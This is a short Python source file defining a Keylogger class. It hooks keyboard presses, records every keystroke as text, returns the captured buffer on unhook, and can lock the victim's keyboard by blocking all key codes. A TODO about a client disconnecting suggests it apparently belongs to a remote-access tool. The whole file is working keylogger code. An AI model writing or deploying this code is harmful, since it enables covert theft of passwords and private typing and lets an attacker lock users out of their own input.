import keyboard
import time

class Keylogger:
    def __init__(self):
        self.keystroke_logged = []
        self.hooking = False
        
    def callback(self, event):
        key = keyboard.normalize_name(event.name)
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '\n'
        elif len(key) != 1:
            key = '[' + key + ']'
        self.keystroke_logged.append(key)

    def clear_history(self):
        self.keystroke_logged = []

    def hook(self):
        if self.hooking == False:
            self.hooking = True
            keyboard.on_press(callback=self.callback)

    def unhook(self):
        r = ''
        if self.hooking == True:
            self.hooking = False
            keyboard.unhook_all()
            for key in self.keystroke_logged:
                r += key
            self.keystroke_logged.clear()
        return r

    def lock(self):
        for i in range(150):
            keyboard.block_key(i)

    def unlock(self):
        keyboard.unhook_all()

# TODO: clear keylogging history when client disconnects before calling unhook
keylogger = Keylogger()
